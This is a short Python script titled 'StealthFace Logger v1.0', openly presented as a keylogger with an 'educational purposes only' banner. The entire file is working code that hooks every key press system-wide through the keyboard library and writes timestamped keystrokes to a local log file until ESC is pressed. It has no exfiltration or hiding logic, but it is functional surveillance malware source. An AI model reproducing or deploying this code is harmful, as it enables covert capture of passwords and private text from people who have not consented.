import keyboard
import datetime
import os

def print_banner():
    banner = """
    ╔════════════════════════════════════════════════════╗
    ║          StealthFace Logger v1.0                   ║
    ║  Coded by Pakistani Ethical Hacker Mr Sabaz Ali Khan║
    ║          For Educational Purposes Only             ║
    ╚════════════════════════════════════════════════════╝
    """
    print(banner)

def log_keystrokes():
    log_file = "keystrokes.log"
    print("Logging keystrokes... Press ESC to stop.")

    def on_key_event(e):
        with open(log_file, "a") as f:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            key = e.name
            if len(key) > 1:
                if key == "space":
                    key = " "
                elif key == "enter":
                    key = "[ENTER]\n"
                elif key == "backspace":
                    key = "[BACKSPACE]"
                else:
                    key = f"[{key.upper()}]"
            f.write(f"{timestamp}: {key}\n")

    keyboard.on_press(on_key_event)
    keyboard.wait("esc")
    print("Logging stopped.")

def main():
    print_banner()
    log_keystrokes()

if __name__ == "__main__":
    main()